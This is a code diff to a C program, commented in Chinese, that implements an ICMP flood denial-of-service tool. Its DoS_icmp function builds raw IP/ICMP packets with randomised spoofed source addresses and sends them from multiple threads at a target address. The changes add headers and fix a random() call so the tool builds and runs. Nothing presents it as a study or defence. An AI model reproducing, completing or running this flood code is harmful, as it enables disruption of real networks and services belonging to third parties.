@@ -6,7 +6,12 @@
 #include <sys/time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/in.h>
+#include <netinet/ip_icmp.h>
 #include <netdb.h>
+#include <arpa/inet.h>
+#include <pthread.h>
 #include <errno.h>
 #include <stdlib.h>
 #include <time.h> 
@@ -33,7 +38,7 @@ static inline long
 	/* 用系统时间初始化 */
 	srand((unsigned)time(0));
 	/* 产生一个介于begin和end之间的值 */
-	ret = random(end)%gap + begin;
+	ret = random()%gap + begin;
 	return ret;
 }
 
@@ -70,7 +75,7 @@ DoS_icmp (void)
 	/* 校验和,先填写为0 */
 	iph->ip_sum = 0;  
 	/* 发送的源地址 */
-	iph->ip_src = (unsigned long) myrandom(0, 65535);  ;      
+	iph->ip_src = (unsigned long) myrandom(0, 65535); 
 	/* 发送目标地址 */
 	iph->ip_dst = dest;    
   
@@ -80,7 +85,7 @@ DoS_icmp (void)
 	/* 代码为0 */
 	icmph->icmp_code = 0;  
 	/* 由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 */
-	icmph->icmp_sum = htons (~(ICMP_ECHO << 8));  
+	icmph->icmp_sum = htons(~(ICMP_ECHO << 8));  
 
 	/* 填写发送目的地址部分 */
 	to.sin_family =  AF_INET;  
@@ -178,12 +183,6 @@ int main(int argc, char *argv[])
 	{
 		pthread_join(pthread[i], NULL);
 	}
-
 	close(rawsock);
-	
 	return 0;
 }
-
-
-
-
